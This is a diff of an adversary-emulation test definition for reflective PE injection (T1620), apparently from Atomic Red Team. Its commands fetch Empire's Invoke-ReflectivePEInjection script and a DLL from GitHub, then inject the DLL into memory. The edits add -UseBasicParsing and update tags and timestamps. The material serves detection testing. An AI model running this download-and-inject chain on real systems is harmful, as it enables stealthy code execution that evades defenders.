@@ -18,15 +18,15 @@
           { exit 0 } else { exit 1 }; then : ; else New-Item -Type Directory (Split-Path
           "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1")
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/dev/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1";
-          fi; if (Test-Path "PathToAtomicsFolder\T1620\bin\reflective_load.dll") {
-          exit 0 } else { exit 1 }; then : ; else Remove-Item -Path "$env:TEMP\T1620_pe_downloaded"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1"
+          -UseBasicParsing; fi; if (Test-Path "PathToAtomicsFolder\T1620\bin\reflective_load.dll")
+          { exit 0 } else { exit 1 }; then : ; else Remove-Item -Path "$env:TEMP\T1620_pe_downloaded"
           -Force -ErrorAction SilentlyContinue; New-Item -Type Directory (Split-Path
           "PathToAtomicsFolder\T1620\bin\reflective_load.dll") -ErrorAction Ignore
           -Force | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1620/bin/reflective_load.dll"
-          -OutFile "PathToAtomicsFolder\T1620\bin\reflective_load.dll"; New-Item -Type
-          File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null; fi; Import-Module
-          "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1";
+          -OutFile "PathToAtomicsFolder\T1620\bin\reflective_load.dll" -UseBasicParsing;
+          New-Item -Type File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null; fi;
+          Import-Module "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1";
           Invoke-ReflectivePEInjection -PEPath "PathToAtomicsFolder\T1620\bin\reflective_load.dll"
           -ExeArgs "#{exe_args}"'
         cleanup: Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue;
@@ -40,8 +40,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
+  - atomic-red-team
   - t1620
   author: Atomic Red Team
   additional_info:
@@ -74,7 +74,7 @@
       get_prereq_command: 'New-Item -Type Directory (Split-Path "#{script_path}")
         -ErrorAction Ignore -Force | Out-Null
 
-        Invoke-WebRequest -Uri "#{script_url}" -OutFile "#{script_path}"
+        Invoke-WebRequest -Uri "#{script_url}" -OutFile "#{script_path}" -UseBasicParsing
 
         '
     - description: PE file must be on disk
@@ -87,11 +87,11 @@
         New-Item -Type Directory (Split-Path "#{pe_path}") -ErrorAction Ignore -Force
         | Out-Null
 
-        Invoke-WebRequest -Uri "#{pe_url}" -OutFile "#{pe_path}"
+        Invoke-WebRequest -Uri "#{pe_url}" -OutFile "#{pe_path}" -UseBasicParsing
 
         New-Item -Type File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null
 
         '
     technique_created: '2021-10-05T01:15:06.293Z'
     atomic_guid: 114c2b95-d992-4c03-8c38-fc58420a3eb5
-    import_timestamp: '2026-10-20T07:08:26.614499Z'
+    import_timestamp: '2026-10-21T07:01:49.378437Z'
